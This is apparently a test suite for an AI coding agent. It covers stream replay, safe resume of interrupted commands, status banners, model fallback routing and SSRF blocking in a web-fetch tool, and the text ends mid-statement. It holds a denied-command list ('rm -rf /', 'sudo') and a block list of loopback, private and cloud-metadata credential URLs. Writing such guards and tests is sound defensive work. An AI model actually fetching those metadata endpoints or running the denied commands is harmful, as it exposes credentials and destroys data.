/* eslint-disable no-console */
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import * as crypto from 'node:crypto';
import * as fs from 'node:fs';
import * as http from 'node:http';
import * as os from 'node:os';
import * as path from 'node:path';
import { PassThrough } from 'node:stream';
import { analyzeShellCommand, commandTouchesProtectedConfig, isProtectedAgentConfigPath } from '../src/agent/shellParser';
import { classifyBlockedIp, SsrfBlockedError, validateSafeFetchUrl } from '../src/agent/ssrf';
import { AgentTask, CompletionProvider } from '../src/agent/task';
import { AgentHost, isCommandAutoApproved, webFetchTool } from '../src/agent/tools';
import {
  buildRouteSummary,
  CompletionRequest,
  CompletionResult,
  PerplexityTransport,
  StreamingClient,
  TransportError,
} from '../src/agent/transport';
import { AgentSettings, UiMessage } from '../src/agent/types';
import { CapabilityFetcher } from '../src/api/capabilityFetcher';
import { getFallbackModelCatalog, setRuntimeModelCatalog } from '../src/api/modelCatalog';
import { PerplexityWebClient } from '../src/api/perplexityClient';
import { RotationEngine } from '../src/api/rotationEngine';
import { AccountSession, QueryRequestOptions, StreamCallbacks, StreamResponseMeta } from '../src/api/types';
import { formatCliStatusLine, parseArgs } from '../src/cli/index';
import { buildDiagnosticBundle, scrubSecretsFromText, serializeDiagnosticBundle } from '../src/core/diagnostics';
import { CoreGate } from '../src/core/gate';
import { detectInterruptedWork, SessionJournal } from '../src/core/journal';
import { evaluatePermission, PermissionConfig } from '../src/core/permissions';
import { CoreSession } from '../src/core/runner';
import { CoreSettings, loadSettings } from '../src/core/settings';
import { CoreEvent, GateVerdict, ToolGate } from '../src/core/types';

type TestFn = () => void | Promise<void>;
const tests: Array<{ name: string; fn: TestFn }> = [];
function test(name: string, fn: TestFn): void {
  tests.push({ name, fn });
}

// -------------------------------------------------------------------------------------------
// Helpers
// -------------------------------------------------------------------------------------------

function makeTmpDir(prefix: string, files: Record<string, string> = {}): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `pcode-35-${prefix}-`));
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, content, 'utf8');
  }
  return dir;
}

function defaultAgentSettings(overrides: Partial<AgentSettings> = {}): AgentSettings {
  return {
    autoApprove: {
      enabled: true,
      read: true,
      readOutsideWorkspace: false,
      write: true,
      execute: true,
      modeSwitch: true,
      subtasks: true,
      todo: true,
      mcp: false,
      web: false,
      retry: true,
    },
    allowedCommands: ['echo', 'node', 'npm test', 'git status'],
    deniedCommands: ['rm -rf /', 'sudo'],
    maxRequests: 25,
    soundEnabled: false,
    checkpointsEnabled: false,
    commandTimeoutSec: 15,
    terminalOutputLines: 200,
    maxReadLines: 1000,
    contextStrategy: 'smart',
    maxPromptChars: 60000,
    webSearch: 'auto',
    language: 'en',
    diffEnabled: true,
    includeFileListOnStart: true,
    customInstructions: '',
    modeInstructions: {},
    stopOnFallback: false,
    ...overrides,
  };
}

class CountingHost implements AgentHost {
  fileEditCount = 0;
  commandRunCount = 0;
  readonly editedPaths: string[] = [];
  readonly executedCommands: string[] = [];

  constructor(readonly cwd: string) {}

  async readFile(absPath: string): Promise<string> {
    return fs.promises.readFile(absPath, 'utf8');
  }
  async writeFile(absPath: string, content: string): Promise<void> {
    await fs.promises.mkdir(path.dirname(absPath), { recursive: true });
    await fs.promises.writeFile(absPath, content, 'utf8');
    this.fileEditCount += 1;
    this.editedPaths.push(absPath);
  }
  async deleteFile(absPath: string): Promise<void> {
    await fs.promises.rm(absPath, { force: true });
  }
  async runCommand(
    command: string,
    cwd: string,
    options: { signal: AbortSignal; timeoutMs: number; onOutput?: (chunk: string) => void }
  ) {
    this.commandRunCount += 1;
    this.executedCommands.push(command);
    return new Promise<{ output: string; exitCode: number | null; timedOut?: boolean }>((resolve) => {
      const child = spawn('/bin/sh', ['-c', command], { cwd });
      let output = '';
      child.stdout.on('data', (chunk: Buffer) => {
        const s = chunk.toString();
        output += s;
        options.onOutput?.(s);
      });
      child.stderr.on('data', (chunk: Buffer) => {
        const s = chunk.toString();
        output += s;
        options.onOutput?.(s);
      });
      const onAbort = () => child.kill('SIGTERM');
      options.signal.addEventListener('abort', onAbort, { once: true });
      child.on('close', (exitCode) => {
        options.signal.removeEventListener('abort', onAbort);
        resolve({ output, exitCode });
      });
    });
  }
}

interface SseReplayScript {
  frames: string[];
  /** Simulate premature TCP close (`res.complete = false`) without `end_of_stream`. */
  abruptClose?: boolean;
  /** Simulate explicit socket error mid-stream. */
  errorMessage?: string;
}

/**
 * Feeds scripted raw SSE frames through `PerplexityWebClient.consumeSseStream` so tests exercise
 * the exact production SSE framing, deduplication, and mid-stream truncation checks.
 */
class SseReplayClient implements StreamingClient {
  callIndex = 0;
  readonly calls: Array<{ query: string; modelId: string; options?: QueryRequestOptions }> = [];
  private readonly parser = new PerplexityWebClient('tok-redacted-test', 'csrf-redacted-test');

  constructor(private readonly scripts: SseReplayScript[]) {}

  streamQuery(
    query: string,
    modelId: string,
    callbacks: StreamCallbacks,
    options?: QueryRequestOptions
  ): AbortController {
    this.calls.push({ query, modelId, options });
    const script = this.scripts[this.callIndex++];
    if (!script) {
      throw new Error(`Unexpected streamQuery call #${this.callIndex}`);
    }
    const controller = new AbortController();
    const stream = new PassThrough() as PassThrough & { complete?: boolean };
    stream.complete = !script.abruptClose;

    const initialMeta: StreamResponseMeta = {
      requestedModel: modelId,
      resolvedModel: modelId,
      displayModel: modelId,
      searchMode: options?.searchMode || 'search',
      mode: options?.requestMode || 'COPILOT',
    };

    this.parser.consumeSseStream(stream, initialMeta, callbacks, controller.signal);

    queueMicrotask(() => {
      for (const frame of script.frames) {
        if (controller.signal.aborted) return;
        stream.write(frame);
      }
      if (script.errorMessage) {
        stream.emit('error', new Error(script.errorMessage));
      } else {
        stream.end();
      }
    });

    return controller;
  }
}

function makeAccount(plan: 'pro' | 'max' = 'max', id = 'acc-1'): AccountSession {
  return {
    id,
    alias: `Account-${id}`,
    sessionToken: 'tok-redacted-test',
    csrfToken: 'csrf-redacted-test',
    status: 'active',
    addedAt: new Date(0).toISOString(),
    queriestoday: 0,
    queriesTotalLifetime: 0,
    errorCount: 0,
    capabilities: {
      plan,
      availableModels: ['turbo', 'claude55sonnet', 'gpt54'],
      unavailableModels: [],
      modes:
        plan === 'max'
          ? ['search', 'research', 'agentic_research', 'studio', 'asi', 'browser_agent']
          : ['search', 'research', 'studio'],
      fetchedAt: new Date().toISOString(),
      source: 'cached',
    } as any,
  };
}

function makeReplayTransport(accounts: AccountSession[], client: SseReplayClient): PerplexityTransport {
  const manager = {
    getAccounts: () => accounts,
    saveMetas: async () => undefined,
    refreshSession: async () => false,
  } as any;
  return new PerplexityTransport(manager, new RotationEngine(), new CapabilityFetcher(), () => client);
}

function sseData(payload: Record<string, unknown>): string {
  return `event: message\ndata: ${JSON.stringify(payload)}\n\n`;
}

const SSE_END = 'event: end_of_stream\ndata: {}\n\n';

function createMinimalZipWithPackageJson(version = '3.5.0'): Buffer {
  const fileName = Buffer.from('extension/package.json', 'utf8');
  const content = Buffer.from(JSON.stringify({ name: 'perplexicode-kilo', version }, null, 2), 'utf8');

  let crc = 0xffffffff;
  for (let i = 0; i < content.length; i += 1) {
    crc ^= content[i];
    for (let j = 0; j < 8; j += 1) {
      crc = (crc >>> 1) ^ (0xedb88320 & -(crc & 1));
    }
  }
  crc = (crc ^ 0xffffffff) >>> 0;

  const localHeader = Buffer.alloc(30 + fileName.length);
  localHeader.writeUInt32LE(0x04034b50, 0);
  localHeader.writeUInt16LE(20, 4);
  localHeader.writeUInt16LE(0, 6);
  localHeader.writeUInt16LE(0, 8);
  localHeader.writeUInt16LE(0, 10);
  localHeader.writeUInt16LE(0, 12);
  localHeader.writeUInt32LE(crc, 14);
  localHeader.writeUInt32LE(content.length, 18);
  localHeader.writeUInt32LE(content.length, 22);
  localHeader.writeUInt16LE(fileName.length, 26);
  localHeader.writeUInt16LE(0, 28);
  fileName.copy(localHeader, 30);

  const centralOffset = localHeader.length + content.length;
  const centralHeader = Buffer.alloc(46 + fileName.length);
  centralHeader.writeUInt32LE(0x02014b50, 0);
  centralHeader.writeUInt16LE(20, 4);
  centralHeader.writeUInt16LE(20, 6);
  centralHeader.writeUInt16LE(0, 8);
  centralHeader.writeUInt16LE(0, 10);
  centralHeader.writeUInt16LE(0, 12);
  centralHeader.writeUInt32LE(crc, 16);
  centralHeader.writeUInt32LE(content.length, 20);
  centralHeader.writeUInt32LE(content.length, 24);
  centralHeader.writeUInt16LE(fileName.length, 28);
  centralHeader.writeUInt16LE(0, 30);
  centralHeader.writeUInt16LE(0, 32);
  centralHeader.writeUInt16LE(0, 34);
  centralHeader.writeUInt16LE(0, 36);
  centralHeader.writeUInt32LE(0, 38);
  centralHeader.writeUInt32LE(0, 42);
  fileName.copy(centralHeader, 46);

  const endRecord = Buffer.alloc(22);
  endRecord.writeUInt32LE(0x06054b50, 0);
  endRecord.writeUInt16LE(0, 4);
  endRecord.writeUInt16LE(0, 6);
  endRecord.writeUInt16LE(1, 8);
  endRecord.writeUInt16LE(1, 10);
  endRecord.writeUInt32LE(centralHeader.length, 12);
  endRecord.writeUInt32LE(centralOffset, 16);
  endRecord.writeUInt16LE(0, 20);

  return Buffer.concat([localHeader, content, centralHeader, endRecord]);
}

function runCommandAsync(
  cmd: string,
  args: string[],
  options: { cwd?: string; env?: NodeJS.ProcessEnv } = {}
): Promise<{ code: number | null; stdout: string; stderr: string }> {
  return new Promise((resolve) => {
    const child = spawn(cmd, args, {
      cwd: options.cwd,
      env: { ...process.env, NO_COLOR: '1', ...options.env },
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => (stdout += d.toString()));
    child.stderr.on('data', (d) => (stderr += d.toString()));
    child.stdin.end();
    child.on('close', (code) => resolve({ code, stdout, stderr }));
  });
}

// -------------------------------------------------------------------------------------------
// F01 — SSE Replay Fixtures (duplicate final chunk, cut-off mid apply_diff, reconnect after edit)
// -------------------------------------------------------------------------------------------

test('F01.1: SSE replay "повтор последнего чанка" edits file once and runs command once', async () => {
  setRuntimeModelCatalog(getFallbackModelCatalog());
  const cwd = makeTmpDir('f01-dup', { 'app.ts': 'export const count = 1;\n' });
  const host = new CountingHost(cwd);
  const diffToolXml = [
    '<apply_diff>',
    '<path>app.ts</path>',
    '<diff>',
    '<<<<<<< SEARCH',
    'export const count = 1;',
    '=======',
    'export const count = 2;',
    '>>>>>>> REPLACE',
    '</diff>',
    '</apply_diff>',
  ].join('\n');
  const cmdToolXml = '<execute_command><command>echo verified-once</command></execute_command>';
  const doneXml = '<attempt_completion><result>Updated count and verified.</result></attempt_completion>';

  const finalFrame1 = sseData({ answer: diffToolXml, backend_uuid: 'thread-1', model: 'claude55sonnet', final: true });
  const finalFrame2 = sseData({ answer: cmdToolXml, backend_uuid: 'thread-1', model: 'claude55sonnet', final: true });
  const finalFrame3 = sseData({ answer: doneXml, backend_uuid: 'thread-1', model: 'claude55sonnet', final: true });

  const client = new SseReplayClient([
    {
      frames: [
        sseData({ delta: diffToolXml.slice(0, 35), backend_uuid: 'thread-1' }),
        finalFrame1,
        finalFrame1, // exact duplicate replay of final chunk
        SSE_END,
      ],
    },
    {
      frames: [
        sseData({ delta: cmdToolXml.slice(0, 20), backend_uuid: 'thread-1' }),
        finalFrame2,
        finalFrame2, // exact duplicate replay of final chunk
        SSE_END,
      ],
    },
    { frames: [finalFrame3, finalFrame3, SSE_END] },
  ]);

  const transport = makeReplayTransport([makeAccount('max')], client);
  const session = new CoreSession({
    cwd,
    host,
    provider: transport,
    agentSettings: defaultAgentSettings(),
    selection: { baseModelId: 'claude55sonnet', thinking: false, webSearch: false },
    permissionMode: 'bypassPermissions',
    journal: false,
    onAsk: async () => ({ response: 'yes' }),
  });

  const result = await session.run('Update count to 2 and run echo');
  assert.equal(result.status, 'completed');
  assert.equal(fs.readFileSync(path.join(cwd, 'app.ts'), 'utf8'), 'export const count = 2;\n');
  assert.equal(host.fileEditCount, 1, 'file must be edited exactly once');
  assert.equal(host.commandRunCount, 1, 'command must be executed exactly once');
});

test('F01.2: SSE replay "обрыв внутри apply_diff" retries truncated stream, edits file once and runs command once', async () => {
  setRuntimeModelCatalog(getFallbackModelCatalog());
  const cwd = makeTmpDir('f01-cutoff', { 'app.ts': 'export const mode = "old";\n' });
  const host = new CountingHost(cwd);
  const truncatedDiff = [
    '<apply_diff>',
    '<path>app.ts</path>',
    '<diff>',
    '<<<<<<< SEARCH',
    'export const mode = "old";',
  ].join('\n');
  const fullDiff = [
    '<apply_diff>',
    '<path>app.ts</path>',
    '<diff>',
    '<<<<<<< SEARCH',
    'export const mode = "old";',
    '=======',
    'export const mode = "new";',
    '>>>>>>> REPLACE',
    '</diff>',
    '</apply_diff>',
  ].join('\n');

  const client = new SseReplayClient([
    // Stream 1 cuts off abruptly inside <apply_diff> without closing tag
    {
      frames: [sseData({ delta: truncatedDiff, backend_uuid: 'thread-cut' })],
      abruptClose: true,
    },
    // Automatic transport retry delivers complete <apply_diff>
    {
      frames: [sseData({ answer: fullDiff, backend_uuid: 'thread-ok', final: true }), SSE_END],
    },
    // Turn 2 runs verification command once
    {
      frames: [
        sseData({
          answer: '<execute_command><command>echo check-after-cutoff</command></execute_command>',
          backend_uuid: 'thread-ok',
          final: true,
        }),
        SSE_END,
      ],
    },
    // Turn 3 finishes
    {
      frames: [
        sseData({
          answer: '<attempt_completion><result>Done cleanly after cutoff.</result></attempt_completion>',
          backend_uuid: 'thread-ok',
          final: true,
        }),
        SSE_END,
      ],
    },
  ]);

  const retries: string[] = [];
  const transport = makeReplayTransport([makeAccount('max')], client);
  const wrappedProvider: CompletionProvider = {
    complete: (req) =>
      transport.complete({
        ...req,
        onRetry: (notice) => {
          retries.push(notice.reason);
          req.onRetry?.(notice);
        },
      }),
  };

  const session = new CoreSession({
    cwd,
    host,
    provider: wrappedProvider,
    agentSettings: defaultAgentSettings(),
    selection: { baseModelId: 'claude55sonnet', thinking: false, webSearch: false },
    permissionMode: 'bypassPermissions',
    journal: false,
    onAsk: async () => ({ response: 'yes' }),
  });

  const result = await session.run('Switch mode to new');
  assert.equal(result.status, 'completed');
  assert.ok(retries.length >= 1, 'transport must emit onRetry when stream cuts off inside apply_diff');
  assert.equal(fs.readFileSync(path.join(cwd, 'app.ts'), 'utf8'), 'export const mode = "new";\n');
  assert.equal(host.fileEditCount, 1, 'file must be edited exactly once');
  assert.equal(host.commandRunCount, 1, 'command must run exactly once');
});

test('F01.3: SSE replay "переподключение после применённой правки" resends history without re-editing file', async () => {
  setRuntimeModelCatalog(getFallbackModelCatalog());
  const cwd = makeTmpDir('f01-reconnect', { 'app.ts': 'export const v = 10;\n' });
  const host = new CountingHost(cwd);
  const fullDiff = [
    '<apply_diff>',
    '<path>app.ts</path>',
    '<diff>',
    '<<<<<<< SEARCH',
    'export const v = 10;',
    '=======',
    'export const v = 20;',
    '>>>>>>> REPLACE',
    '</diff>',
    '</apply_diff>',
  ].join('\n');

  const client = new SseReplayClient([
    // Turn 1: edit succeeds on thread-A
    {
      frames: [sseData({ answer: fullDiff, backend_uuid: 'thread-A', final: true }), SSE_END],
    },
    // Turn 2 attempt 1 (follow-up on thread-A): connection drops mid-stream!
    {
      frames: [sseData({ delta: 'Checking ' })],
      errorMessage: 'ECONNRESET after applied edit',
    },
    // Turn 2 attempt 2 (reconnect resending fullPrompt without thread): runs command once
    {
      frames: [
        sseData({
          answer: '<execute_command><command>echo post-reconnect-ok</command></execute_command>',
          backend_uuid: 'thread-B',
          final: true,
        }),
        SSE_END,
      ],
    },
    // Turn 3: completes
    {
      frames: [
        sseData({
          answer: '<attempt_completion><result>Reconnected cleanly.</result></attempt_completion>',
          backend_uuid: 'thread-B',
          final: true,
        }),
        SSE_END,
      ],
    },
  ]);

  const transport = makeReplayTransport([makeAccount('max')], client);
  const session = new CoreSession({
    cwd,
    host,
    provider: transport,
    agentSettings: defaultAgentSettings(),
    selection: { baseModelId: 'claude55sonnet', thinking: false, webSearch: false },
    permissionMode: 'bypassPermissions',
    journal: false,
    onAsk: async () => ({ response: 'yes' }),
  });

  const result = await session.run('Update v to 20 and verify');
  assert.equal(result.status, 'completed');
  assert.match(client.calls[2].query, /Applied diff|app\.ts/);
  assert.equal(client.calls[2].options?.followUp, undefined, 'reconnect must drop broken follow-up thread');
  assert.equal(fs.readFileSync(path.join(cwd, 'app.ts'), 'utf8'), 'export const v = 20;\n');
  assert.equal(host.fileEditCount, 1, 'file must be edited exactly once');
  assert.equal(host.commandRunCount, 1, 'command must run exactly once');
});

// -------------------------------------------------------------------------------------------
// F02 — Resume without re-running unconfirmed command
// -------------------------------------------------------------------------------------------

test('F02: interrupted command is marked "результат не подтверждён" and resume inspects state without 2nd run', async () => {
  const cwd = makeTmpDir('f02-resume', { 'state.txt': 'before\n' });
  const journalDir = makeTmpDir('f02-sessions');
  const cmd = 'echo deployed > state.txt';

  // Simulate run #1: command started and wrote `state.txt`, then stream/process aborted before `command_end`.
  let commandRuns = 0;
  fs.writeFileSync(path.join(cwd, 'state.txt'), 'deployed\n', 'utf8');
  commandRuns += 1;

  const taskId = 'task-interrupted-f02';
  const journal = new SessionJournal(taskId, journalDir);
  journal.append({ type: 'session_start', id: taskId, title: 'Deploy state', mode: 'code', cwd });
  journal.append({ type: 'command_start', command: cmd, cwd });
  journal.snapshot({
    version: 1,
    id: taskId,
    title: 'Deploy state',
    workspace: cwd,
    mode: 'code',
    status: 'aborted',
    createdAt: Date.now() - 1000,
    updatedAt: Date.now(),
    requestCount: 1,
    apiMessages: [
      { role: 'user', content: 'Run deploy command once', ts: Date.now() - 900 },
      { role: 'assistant', content: `<execute_command><command>${cmd}</command></execute_command>`, ts: Date.now() - 800 },
    ],
    uiMessages: [
      { id: 'u1', ts: Date.now() - 900, role: 'user', type: 'user', text: 'Run deploy command once' },
    ],
    todos: [],
  });

  const interrupted = detectInterruptedWork(SessionJournal.events(taskId, journalDir));
  assert.deepEqual(interrupted.unknownCommands, [cmd]);

  // Resume session:
  // Turn 1: model tries to re-run `<execute_command>` blindly -> blocked with "результат не подтверждён"!
  // Turn 2: model inspects state via `<read_file><path>state.txt</path></read_file>`.
  // Turn 3: model sees `deployed` and calls `<attempt_completion>`.
  let turn = 0;
  const scriptedProvider: CompletionProvider = {
    async complete(req: CompletionRequest): Promise<CompletionResult> {
      turn += 1;
      let text: string;
      if (turn === 1) {
        text = `<execute_command><command>${cmd}</command></execute_command>`;
      } else if (turn === 2) {
        assert.match(req.fullPrompt, /результат не подтверждён/i, 'blocked re-run must cite unconfirmed status');
        text = '<read_file><path>state.txt</path></read_file>';
      } else {
        assert.match(req.fullPrompt, /deployed/, 'read_file output must show actual state');
        text = '<attempt_completion><result>Confirmed state.txt already has deployed.</result></attempt_completion>';
      }
      req.onText?.(text, text);
      return {
        text,
        meta: { requestedModel: 'turbo', resolvedModel: 'turbo', displayModel: 'Best', searchMode: 'search', mode: 'COPILOT' },
        accountAlias: 'Test',
        modelLabel: 'Best',
        citations: [],
        usedFollowUp: false,
        promptChars: req.fullPrompt.length,
      };
    },
  };

  const host = new CountingHost(cwd);
  const coreSettings: CoreSettings = {
    ...loadSettings(cwd),
    permissions: {
      allow: [`Bash(${cmd})`, 'Read(*)'],
      ask: [],
      deny: [],
      defaultMode: 'default',
      protectSecrets: true,
    },
  };

  const session = new CoreSession({
    cwd,
    host,
    provider: scriptedProvider,
    agentSettings: defaultAgentSettings(),
    selection: { baseModelId: 'turbo', thinking: false, webSearch: false },
    settings: coreSettings,
    journal: true,
    journalDir,
    onAsk: async () => ({ response: 'yes' }),
  });

  const summary = await session.resume(taskId, 'Continue safely');
  assert.equal(summary.status, 'completed');
  assert.equal(host.commandRunCount, 0, 'resumed session must NOT execute the command a second time');
  assert.equal(commandRuns + host.commandRunCount, 1, 'total command executions across crash + resume must equal 1');

  const eventsAfter = SessionJournal.events(taskId, journalDir);
  const unconfirmedEvent = eventsAfter.find((e) => e.type === 'command_unconfirmed');
  assert.ok(unconfirmedEvent && unconfirmedEvent.type === 'command_unconfirmed', 'journal must record command_unconfirmed');
  assert.match(unconfirmedEvent.status, /результат не подтверждён/);
});

// -------------------------------------------------------------------------------------------
// F03 — Task status banner in IDE & CLI status line with concrete reason & rule
// -------------------------------------------------------------------------------------------

test('F03: task banner & CLI status line expose all 4 Russian states with concrete reason and rule', async () => {
  const cwd = makeTmpDir('f03-banners', { 'index.ts': 'export const ok = true;\n' });
  const host = new CountingHost(cwd);
  const seenBanners: Array<Extract<CoreEvent, { type: 'banner' }>> = [];

  let callNum = 0;
  const provider: CompletionProvider = {
    async complete(req: CompletionRequest): Promise<CompletionResult> {
      callNum += 1;
      let text: string;
      if (callNum === 1) {
        req.onRetry?.({
          reason: 'Поток оборвался до закрытия XML-инструмента',
          rule: 'transport.incompleteToolCall',
        });
        text = '<execute_command><command>echo need-human-approval</command></execute_command>';
      } else {
        text = '<attempt_completion><result>Done</result></attempt_completion>';
      }
      req.onText?.(text, text);
      return {
        text,
        meta: { requestedModel: 'turbo', resolvedModel: 'turbo', displayModel: 'Best', searchMode: 'search', mode: 'COPILOT' },
        accountAlias: 'Test',
        modelLabel: 'Best',
        citations: [],
        usedFollowUp: false,
        promptChars: req.fullPrompt.length,
      };
    },
  };

  let verifiedOnce = false;
  const gate: ToolGate = {
    async preToolUse(): Promise<GateVerdict> {
      return { decision: 'ask', reason: 'Команда не входит в allowlist', source: 'permissions.ask: Bash' };
    },
    async stop() {
      if (!verifiedOnce) {
        verifiedOnce = true;
      }
      return {};
    },
  };

  const handledAskIds = new Set<string>();
  const task = new AgentTask({
    host,
    provider,
    gate,
    mode: 'code',
    getSettings: () =>
      defaultAgentSettings({
        autoApprove: { ...defaultAgentSettings().autoApprove, execute: false },
      }),
    getSelection: () => ({ baseModelId: 'turbo', thinking: false, webSearch: false }),
    getModelLabel: () => 'Best',
    callbacks: {
      onMessage: () => {},
      onState: (owner) => {
        if (owner.status.state === 'waiting' && owner.status.askId && !handledAskIds.has(owner.status.askId)) {
          const askId = owner.status.askId;
          handledAskIds.add(askId);
          queueMicrotask(() => owner.respond(askId, { response: 'yes' }));
        }
      },
      onEvent: (_owner, event) => {
        if (event.type === 'banner') {
          seenBanners.push(event);
        }
      },
    },
  });

  await task.start('Test banners');
  assert.equal(task.status.state, 'completed');

  // Also trigger "нужно вмешательство" via TransportError('...', 'fallback_blocked', 'perplexicodeKilo.agent.stopOnFallback')
  const blockedHandled = new Set<string>();
  const blockedTask = new AgentTask({
    host,
    provider: {
      async complete() {
        throw new TransportError(
          'Остановлено вместо fallback: Computer → Search',
          'fallback_blocked',
          'perplexicodeKilo.agent.stopOnFallback'
        );
      },
    },
    mode: 'code',
    getSettings: () => defaultAgentSettings({ stopOnFallback: true }),
    getSelection: () => ({ baseModelId: 'turbo', thinking: false, webSearch: false, computeMode: 'computer' }),
    getModelLabel: () => 'Best',
    callbacks: {
      onMessage: () => {},
      onState: (owner) => {
        if (owner.status.state === 'waiting' && owner.status.askId && !blockedHandled.has(owner.status.askId)) {
          const askId = owner.status.askId;
          blockedHandled.add(askId);
          queueMicrotask(() => owner.respond(askId, { response: 'no' }));
        }
      },
      onEvent: (_owner, event) => {
        if (event.type === 'banner') {
          seenBanners.push(event);
        }
      },
    },
  });
  await blockedTask.start('Trigger intervention');

  const labels = new Set(seenBanners.map((b) => b.label));
  assert.ok(labels.has('повторяю запрос'), `missing повторяю запрос in ${JSON.stringify(seenBanners)}`);
  assert.ok(labels.has('жду подтверждения'), `missing жду подтверждения in ${JSON.stringify(seenBanners)}`);
  assert.ok(labels.has('проверяю результат'), `missing проверяю результат in ${JSON.stringify(seenBanners)}`);
  assert.ok(labels.has('нужно вмешательство'), `missing нужно вмешательство in ${JSON.stringify(seenBanners)}`);

  for (const b of seenBanners) {
    assert.ok(b.reason.length > 0, `banner ${b.label} must include concrete reason`);
    assert.ok(b.rule.length > 0, `banner ${b.label} must include rule name`);
    const cliLine = formatCliStatusLine(b);
    assert.match(cliLine, new RegExp(b.label));
    assert.match(cliLine, /правило:/);
  }
});

// -------------------------------------------------------------------------------------------
// F04 — Route line ("запрошенный режим → фактический, причина", "не сообщена") + stopOnFallback
// -------------------------------------------------------------------------------------------

test('F04: routeLine reports "не сообщена" when backend omits actual model, and stopOnFallback halts fallback', async () => {
  setRuntimeModelCatalog(getFallbackModelCatalog());

  // 1. Direct route summary when backend does not report actual model
  const unreported = buildRouteSummary({
    requestedModeLabel: 'Search',
    actualModeLabel: 'Search',
    requestedModelLabel: 'Claude 5.5 Sonnet',
    reportedModel: undefined,
  });
  assert.match(unreported.line, /не сообщена/, 'missing reportedModel must explicitly say "не сообщена"');
  assert.match(unreported.line, /→/);

  // 2. Fallback route summary when Pro account requests `computer` mode with `stopOnFallback: false`
  const proAccount = makeAccount('pro');
  const clientOk = new SseReplayClient([
    {
      frames: [
        sseData({
          answer: '<attempt_completion><result>Fallback worked</result></attempt_completion>',
          backend_uuid: 'u-1',
          final: true,
          // Note: no `model` field in SSE payload -> reportedModel is undefined -> "не сообщена"
        }),
        SSE_END,
      ],
    },
  ]);
  const transportAllowed = makeReplayTransport([proAccount], clientOk);
  const resAllowed = await transportAllowed.complete({
    baseModelId: 'claude55sonnet',
    thinking: false,
    webSearch: false,
    computeMode: 'computer',
    stopOnFallback: false,
    fullPrompt: 'hi',
    signal: new AbortController().signal,
  });
  assert.ok(resAllowed.route?.fallbackUsed, 'Pro account requesting computer mode must mark fallbackUsed');
  assert.match(resAllowed.route!.line, /Computer.*→.*Search/i);
  assert.match(resAllowed.route!.line, /не сообщена/);

  // 3. Same Pro pool with `stopOnFallback: true` MUST throw TransportError('...', 'fallback_blocked') before sending query!
  const clientNeverCalled = new SseReplayClient([]);
  const transportStopped = makeReplayTransport([proAccount], clientNeverCalled);
  await assert.rejects(
    transportStopped.complete({
      baseModelId: 'claude55sonnet',
      thinking: false,
      webSearch: false,
      computeMode: 'computer',
      stopOnFallback: true,
      fullPrompt: 'hi',
      signal: new AbortController().signal,
    }),
    (err: unknown) =>
      err instanceof TransportError &&
      err.kind === 'fallback_blocked' &&
      Boolean(err.rule && err.rule.includes('stopOnFallback'))
  );
  assert.equal(clientNeverCalled.callIndex, 0, 'stopOnFallback must stop before sending fallback request');
  assert.equal(parseArgs(['--stop-on-fallback', '-p', 'test']).stopOnFallback, true);
});

// -------------------------------------------------------------------------------------------
// F05 — SSRF protection in web_fetch across all address classes & redirect hops
// -------------------------------------------------------------------------------------------

test('F05: web_fetch blocks loopback, private, link-local, 169.254.169.254, IPv6 equivalents, and internal redirects', async () => {
  const blockedUrls: Array<{ url: string; expectedClass: string }> = [
    { url: 'http://127.0.0.1/admin', expectedClass: 'loopback' },
    { url: 'http://127.99.1.2:8080/health', expectedClass: 'loopback' },
    { url: 'http://[::1]/secret', expectedClass: 'loopback' },
    { url: 'http://[::ffff:127.0.0.1]/mapped', expectedClass: 'loopback' },
    { url: 'http://localhost:3000/api', expectedClass: 'loopback' },
    { url: 'http://sub.localhost/api', expectedClass: 'loopback' },
    { url: 'http://10.0.0.1/internal', expectedClass: 'private' },
    { url: 'http://172.16.0.5/internal', expectedClass: 'private' },
    { url: 'http://172.31.255.254/internal', expectedClass: 'private' },
    { url: 'http://192.168.1.1/router', expectedClass: 'private' },
    { url: 'http://[fc00::1]/ula', expectedClass: 'private' },
    { url: 'http://[fd12:3456:789a::1]/ula', expectedClass: 'private' },
    { url: 'http://169.254.169.254/latest/meta-data/iam/', expectedClass: 'metadata' },
    { url: 'http://[::ffff:169.254.169.254]/latest/meta-data/', expectedClass: 'metadata' },
    { url: 'http://metadata.google.internal/computeMetadata/v1/', expectedClass: 'metadata' },
    { url: 'http://169.254.10.20/link-local', expectedClass: 'link-local' },
    { url: 'http://[fe80::1]/link-local6', expectedClass: 'link-local' },
    { url: 'http://100.64.0.10/cgnat', expectedClass: 'shared-private' },
    { url: 'http://0.0.0.0/', expectedClass: 'unspecified' },
  ];

  for (const entry of blockedUrls) {
    await assert.rejects(
      validateSafeFetchUrl(entry.url),
      (err: unknown) => err instanceof SsrfBlockedError && err.addressClass === entry.expectedClass,
      `Expected ${entry.url} to fail with class ${entry.expectedClass}`
    );
  }

  assert.equal(classifyBlockedIp('93.184.216.34'), null);
  assert.equal(classifyBlockedIp('2606:2800:220:1:248:1893:25c8:1946'), null);

  await assert.rejects(
    validateSafeFetchUrl('https://dual-homed.example.com/', async () => [
      { address: '93.184.216.34', family: 4 },
      { address: '10.1.2.3', family: 4 },
    ]),
    (err: unknown) => err instanceof SsrfBlockedError && err.addressClass === 'private'
  );

  let internalHit = false;
  const server = http.createServer((req, res) => {
    if (req.url === '/to-metadata') {
      res.writeHead(302, { location: 'http://169.254.169.254/latest/meta-data/' }).end();
    } else if (req.url === '/to-corp-lan') {
      res.writeHead(302, { location: 'http://intranet.corp.example/secret' }).end();
    } else {
      internalHit = true;
      res.writeHead(200).end('should-never-reach');
    }
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()));
  const { port } = server.address() as { port: number };
  try {
    const mockLookup = async (host: string) => {
      if (host === 'public.example.com') {
        return [{ address: '93.184.216.34', family: 4 as const }];
      }
      if (host === 'intranet.corp.example') {
        return [{ address: '192.168.50.10', family: 4 as const }];
      }
      return [{ address: '127.0.0.1', family: 4 as const }];
    };

    await assert.rejects(
      webFetchTool(`http://public.example.com:${port}/to-metadata`, {
        lookup: mockLookup,
        _testSocketAddress: '127.0.0.1',
      }),
      (err: unknown) => err instanceof SsrfBlockedError && err.addressClass === 'metadata'
    );

    await assert.rejects(
